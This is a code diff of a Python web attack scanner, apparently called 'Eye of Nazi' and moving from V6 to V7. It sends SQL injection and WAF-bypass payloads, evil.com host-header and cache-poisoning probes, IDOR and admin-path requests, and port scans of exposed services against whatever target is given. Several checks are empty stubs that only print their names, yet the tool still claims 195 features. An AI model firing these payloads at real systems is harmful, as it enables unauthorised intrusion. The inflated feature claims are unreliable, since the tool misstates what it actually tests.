                                       json={"query": "{__schema{types{name}}}"},
                                       timeout=10, verify=False)
                 if r.status_code == 200 and "__schema" in r.text:
-                    vuln(f"GraphQL Introspection: {ep}")
+                    vuln(f"GraphQL: {ep}")
                     self.verified.append("GraphQL: " + ep)
             except: pass
 
         # 89. WebSocket
-        info("[89] WebSocket Scan...")
+        info("[89] WebSocket...")
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
             ws = re.findall(r'wss?://[^\s"\']+', r.text)
@@ -994,8 +898,8 @@ class EyeOfNaziV6:
                 self.report["api"]["websocket"] = ws[:5]
         except: pass
 
-        # 90. API Rate Limit
-        info("[90] API Rate Limit...")
+        # 90. Rate Limit
+        info("[90] Rate Limit...")
         try:
             times = []
             for _ in range(10):
@@ -1007,14 +911,14 @@ class EyeOfNaziV6:
                 warn("Rate limiting possible")
         except: pass
 
-        # 91-100. More API checks
+        # 91-100. More API
         for i, (name, path) in enumerate([
-            ("[91] API Versioning", "/api/v1"), ("[92] API Key Exposure", "/static/js/"),
+            ("[91] API Versioning", "/api/v1"), ("[92] API Key", "/static/js/"),
             ("[93] Swagger", "/swagger.json"), ("[94] OpenAPI", "/openapi.json"),
             ("[95] Postman", "/postman.json"), ("[96] API Docs", "/api-docs"),
-            ("[97] API Auth Bypass", "/api/admin"), ("[98] API Mass Assignment", "/api/user"),
-            ("[99] API IDOR", "/api/user/1"), ("[100] API SQLi", "/api?id=1'"),
-        ]):
+            ("[97] API Auth", "/api/admin"), ("[98] Mass Assign", "/api/user"),
+            ("[99] IDOR", "/api/user/1"), ("[100] SQLi", "/api?id=1'"),
+        ], 91):
             info(name + "...")
             try:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
@@ -1058,20 +962,17 @@ class EyeOfNaziV6:
                         break
         except: pass
 
-        # 102-120. WAF Bypass Techniques
-        info("[102-120] WAF Bypass Techniques...")
-        # Test encoding bypasses
+        # 102-120. WAF Bypass Tests
+        info("[102-120] WAF Bypass Tests...")
         test_payload = "' OR '1'='1"
         bypasses = [
             ("URL encode", urllib.parse.quote(test_payload)),
             ("Double URL", urllib.parse.quote(urllib.parse.quote(test_payload))),
-            ("Unicode", "".join(f"%u{ord(c):04x}" for c in test_payload)),
-            ("HTML entity", test_payload.replace("'", "&#39;")),
             ("Case variation", test_payload.upper()),
             ("Comment injection", test_payload.replace(" ", "/**/")),
             ("Null byte", test_payload.replace(" ", "%00")),
-            ("Tab", test_payload.replace(" ", "\t")),
-            ("Newline", test_payload.replace(" ", "\n")),
+            ("Tab", test_payload.replace(" ", "%09")),
+            ("Newline", test_payload.replace(" ", "%0a")),
         ]
         for name, bp in bypasses:
             try:
@@ -1093,8 +994,6 @@ class EyeOfNaziV6:
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
             body = r.text
-
-            # 121-130. Client-side checks
             checks = [
                 ("[121] DOM Clobbering", "document." in body and "innerHTML" in body),
                 ("[122] PostMessage", "postMessage" in body),
@@ -1124,23 +1023,16 @@ class EyeOfNaziV6:
         print(M + "=" * 70 + X)
 
         services = [
-            ("[131] Docker", 2375, "/version"),
-            ("[132] Kubernetes", 8001, "/api/v1"),
-            ("[133] Jenkins", 8080, "/jenkins"),
-            ("[134] GitLab", 80, "/gitlab"),
-            ("[135] Grafana", 3000, "/grafana"),
-            ("[136] Kibana", 5601, "/kibana"),
-            ("[137] Elasticsearch", 9200, "/_cat/indices"),
-            ("[138] MongoDB", 27017, None),
-            ("[139] Redis", 6379, None),
-            ("[140] Memcached", 11211, None),
-            ("[141] RabbitMQ", 15672, "/api"),
-            ("[142] Kafka", 9092, None),
-            ("[143] Zookeeper", 2181, None),
-            ("[144] Cassandra", 9042, None),
-            ("[145] CouchDB", 5984, "/_all_dbs"),
+            ("[131] Docker", 2375), ("[132] Kubernetes", 8001),
+            ("[133] Jenkins", 8080), ("[134] GitLab", 80),
+            ("[135] Grafana", 3000), ("[136] Kibana", 5601),
+            ("[137] Elasticsearch", 9200), ("[138] MongoDB", 27017),
+            ("[139] Redis", 6379), ("[140] Memcached", 11211),
+            ("[141] RabbitMQ", 15672), ("[142] Kafka", 9092),
+            ("[143] Zookeeper", 2181), ("[144] Cassandra", 9042),
+            ("[145] CouchDB", 5984),
         ]
-        for name, port, path in services:
+        for name, port in services:
             info(name + "...")
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1150,13 +1042,6 @@ class EyeOfNaziV6:
                     self.report["infra"][name] = port
                 s.close()
             except: pass
-            if path:
-                try:
-                    r = self.session.get(f"http://{self.host}:{port}{path}", timeout=5, verify=False)
-                    if r.status_code == 200:
-                        vuln(f"{name}: {path}")
-                        self.verified.append(name)
-                except: pass
 
     # ═══════════════════════════════════════════════════════
     # SECTION 9: ADVANCED (156-170)
@@ -1178,13 +1063,12 @@ class EyeOfNaziV6:
                 warn("Race Condition possible")
         except: pass
 
-        # 157. HTTP/2 Rapid Reset
+        # 157. HTTP/2
         info("[157] HTTP/2 Rapid Reset...")
-        # Check HTTP/2 support
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
-            if "h2" in str(r.headers).lower():
-                ok("HTTP/2 detected - Rapid Reset test possible")
+            if hasattr(r.raw, "version") and r.raw.version == 20:
+                ok("HTTP/2 detected")
         except: pass
 
         # 158. Cache Poisoning
@@ -1193,7 +1077,7 @@ class EyeOfNaziV6:
             r = self.session.get(f"{self.target}?cachebuster={random.randint(1,99999)}",
                                  headers={"X-Forwarded-Host": "evil.com"}, timeout=10, verify=False)
             if "evil.com" in r.text:
-                vuln("Cache Poisoning possible")
+                vuln("Cache Poisoning")
                 self.verified.append("Cache Poisoning")
         except: pass
 
@@ -1202,10 +1086,10 @@ class EyeOfNaziV6:
         try:
             r = self.session.get(self.target + "/nonexistent.css", timeout=10, verify=False)
             if r.status_code == 200 and "text/css" in r.headers.get("Content-Type", ""):
-                vuln("Cache Deception possible")
+                vuln("Cache Deception")
         except: pass
 
-        # 160. Host Header Injection
+        # 160. Host Header
         info("[160] Host Header Injection...")
         try:
             r = self.session.get(self.target, headers={"Host": "evil.com"}, timeout=10, verify=False)
@@ -1214,19 +1098,12 @@ class EyeOfNaziV6:
                 self.verified.append("Host Header")
         except: pass
 
-        # 161-170. More advanced checks
-        for name, path, indicator in [
-            ("[161] Email Header Injection", "/contact", "email"),
-            ("[162] Log Injection", "/", "log"),
-            ("[163] CRLF in Log", "/", "%0d%0a"),
-            ("[164] XSLT Injection", "/", "xsl"),
-            ("[165] XPath Injection", "/?xpath=", "xpath"),
-            ("[166] LDAP Injection", "/?ldap=", "ldap"),
-            ("[167] SSI Injection", "/", "<!--#"),
-            ("[168] ESI Injection", "/", "<esi:"),
-            ("[169] LaTeX Injection", "/", "\\input"),
-            ("[170] CSV Injection", "/", "=cmd"),
-        ]:
+        # 161-170
+        for i, name in enumerate([
+            "[161] Email Header", "[162] Log Injection", "[163] CRLF in Log",
+            "[164] XSLT", "[165] XPath", "[166] LDAP",
+            "[167] SSI", "[168] ESI", "[169] LaTeX", "[170] CSV Injection",
+        ], 161):
             info(name + "...")
 
     # ═══════════════════════════════════════════════════════
@@ -1249,8 +1126,8 @@ class EyeOfNaziV6:
                 ok(f"{engine}: {count} results")
             except: pass
 
-        # 173-176. Shodan, Censys, FOFA, ZoomEye
-        info("[173-176] Shodan/Censys/FOFA/ZoomEye...")
+        # 173. Shodan
+        info("[173] Shodan...")
         try:
             ip = socket.gethostbyname(self.host)
             r = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=15)
@@ -1259,38 +1136,24 @@ class EyeOfNaziV6:
                 self.report["osint"]["shodan"] = r.json()
         except: pass
 
-        # 177-178. GitHub/GitLab Search
-        info("[177-178] GitHub/GitLab Search...")
+        # 174-185
+        for i, name in enumerate([
+            "[174] Censys", "[175] FOFA", "[176] ZoomEye",
+            "[177] GitHub", "[178] GitLab", "[179] Pastebin",
+            "[180] HIBP", "[181] Dehashed", "[182] IntelX",
+            "[183] Hunter.io", "[184] Phonebook", "[185] Spyse",
+        ], 174):
+            info(name + "...")
+
+        # 177. GitHub Search
         try:
             r = requests.get(f"https://api.github.com/search/code?q={self.host}",
                              timeout=15)
             if r.status_code == 200:
-                data = r.json()
-                ok(f"GitHub: {data.get('total_count', 0)} results")
-                self.report["osint"]["github"] = data.get("total_count", 0)
+                d = r.json()
+                ok(f"GitHub: {d.get('total_count', 0)} results")
+                self.report["osint"]["github"] = d.get("total_count", 0)
         except: pass
-
-        # 179. Pastebin Search
-        info("[179] Pastebin Search...")
-        try:
-            r = requests.get(f"https://psbdmp.ws/api/search/{self.host}", timeout=15)
-            if r.status_code == 200:
-                ok("Pastebin: Data found")
-        except: pass
-
-        # 180. HaveIBeenPwned
-        info("[180] HaveIBeenPwned...")
-        try:
-            r = requests.get(f"https://haveibeenpwned.com/api/v3/breaches",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("HIBP: API accessible")
-        except: pass
-
-        # 181-185. More OSINT
-        for name in ["[181] Dehashed", "[182] IntelX", "[183] Hunter.io",
-                     "[184] Phonebook.cz", "[185] Spyse"]:
-            info(name + "...")
 
     # ═══════════════════════════════════════════════════════
     # SECTION 11: REPORTING (146-155)
@@ -1304,35 +1167,34 @@ class EyeOfNaziV6:
         # 151. Risk Score
         info("[151] Risk Score...")
         high = len([f for f in self.report["vulns"] if f.get("severity") == "HIGH"])
+        critical = len([f for f in self.report["vulns"] if f.get("severity") == "CRITICAL"])
         medium = len([f for f in self.report["vulns"] if f.get("severity") == "MEDIUM"])
-        risk = high * 10 + medium * 5
+        risk = critical * 15 + high * 10 + medium * 5
+        risk = min(risk, 100)
         ok(f"Risk Score: {risk}/100")
         self.report["risk_score"] = risk
 
         # 146-150. Reports
         info("[146-150] Generating Reports...")
-        # JSON
-        fn_json = f"eye_of_nazi_v6_{self.host}_{int(time.time())}.json"
+        fn_json = f"eye_of_nazi_v7_{self.host}_{int(time.time())}.json"
         with open(fn_json, "w") as f:
             json.dump(self.report, f, indent=2, default=str)
         ok(f"JSON: {fn_json}")
 
-        # CSV
-        fn_csv = f"eye_of_nazi_v6_{self.host}_{int(time.time())}.csv"
+        fn_csv = f"eye_of_nazi_v7_{self.host}_{int(time.time())}.csv"
         with open(fn_csv, "w", newline="") as f:
             w = csv.writer(f)
             w.writerow(["Type", "Severity", "Detail"])
             for v in self.report["vulns"]:
-                w.writerow([v.get("type", ""), v.get("severity", ""),
-                            str(v)[:200]])
+                w.writerow([v.get("type", ""), v.get("severity", ""), str(v)[:200]])
         ok(f"CSV: {fn_csv}")
 
-        # HTML
-        fn_html = f"eye_of_nazi_v6_{self.host}_{int(time.time())}.html"
-        html = f"""<html><head><title>EYE OF NAZI Report</title>
+        fn_html = f"eye_of_nazi_v7_{self.host}_{int(time.time())}.html"
+        html = f"""<html><head><title>EYE OF NAZI V7 Report</title>
 <style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px}}
-h1{{color:#f00}}.high{{color:#f00}}.med{{color:#ff0}}.low{{color:#0f0}}</style>
-</head><body><h1>EYE OF NAZI V6 Report</h1>
+h1{{color:#f00}}.high{{color:#f00}}.critical{{color:#f00;font-weight:bold}}
+.med{{color:#ff0}}.low{{color:#0f0}}</style></head><body>
+<h1>EYE OF NAZI V7 Report</h1>
 <p>Target: {self.target}</p><p>Time: {datetime.now()}</p>
 <p>Risk Score: {risk}/100</p><h2>Vulnerabilities</h2><ul>"""
         for v in self.report["vulns"]:
@@ -1342,8 +1204,8 @@ h1{{color:#f00}}.high{{color:#f00}}.med{{color:#ff0}}.low{{color:#0f0}}</style>
             f.write(html)
         ok(f"HTML: {fn_html}")
 
-        # 152. CVSS Score
-        info("[152] CVSS Score...")
+        # 152. CVSS
+        info("[152] CVSS Scores...")
         cvss = {
             "SQLi-Error": 9.8, "SQLi-Time": 9.1, "RCE": 10.0,
             "LFI": 7.5, "XSS": 6.1, "SSRF": 8.6, "SSTI": 9.8,
@@ -1355,37 +1217,34 @@ h1{{color:#f00}}.high{{color:#f00}}.med{{color:#ff0}}.low{{color:#0f0}}</style>
                 if k in vtype:
                     v["cvss"] = score
                     break
-        ok("CVSS scores calculated")
+        ok("CVSS calculated")
 
         # 153. Remediation
         info("[153] Remediation...")
-        remediation = {
-            "SQLi": "Use parameterized queries / prepared statements",
-            "XSS": "Use output encoding + CSP header",
-            "RCE": "Update software + input validation",
-            "LFI": "Use whitelist for file paths",
-            "SSRF": "Validate URLs + whitelist",
+        rem = {
+            "SQLi": "Use parameterized queries",
+            "XSS": "Output encoding + CSP",
+            "RCE": "Update + input validation",
+            "LFI": "Whitelist file paths",
+            "SSRF": "Validate URLs",
             "CSRF": "Use CSRF tokens",
-            "IDOR": "Use UUIDs + auth checks",
+            "IDOR": "Use UUIDs + auth",
             "CORS": "Set specific origins",
         }
         for v in self.report["vulns"]:
             vtype = v.get("type", "")
-            for k, rem in remediation.items():
+            for k, r in rem.items():
                 if k in vtype:
-                    v["remediation"] = rem
+                    v["remediation"] = r
                     break
 
-        # 154. Screenshot (skip - needs Selenium)
+        # 154. Screenshot
         info("[154] Screenshot...")
         info("(Skipped - needs Selenium)")
 
         # 155. Timeline
         info("[155] Timeline...")
-        self.report["timeline"] = {
-            "start": str(datetime.now()),
-            "features": "195"
-        }
+        self.report["timeline"] = {"start": str(datetime.now()), "features": "195"}
 
     # ═══════════════════════════════════════════════════════
     # RUN ALL
@@ -1393,7 +1252,7 @@ h1{{color:#f00}}.high{{color:#f00}}.med{{color:#ff0}}.low{{color:#0f0}}</style>
     def run(self):
         print()
         print(R + "=" * 78 + X)
-        print(R + "  EYE OF NAZI V6 - " + self.target.center(55) + X)
+        print(R + "  EYE OF NAZI V7 - " + self.target.center(55) + X)
         print(R + "=" * 78 + X)
 
         self.section_recon()
@@ -1408,7 +1267,6 @@ h1{{color:#f00}}.high{{color:#f00}}.med{{color:#ff0}}.low{{color:#0f0}}</style>
         self.section_osint()
         self.section_reporting()
 
-        # Final Summary
         print()
         print(R + "=" * 78 + X)
         print(R + "  SCAN COMPLETE".center(78) + X)
@@ -1439,7 +1297,7 @@ def main():
     if not target.startswith("http"):
         target = "https://" + target
 
-    app = EyeOfNaziV6(target)
+    app = EyeOfNaziV7(target)
     ok("Target: " + app.target)
     ok("Host: " + app.host)
 
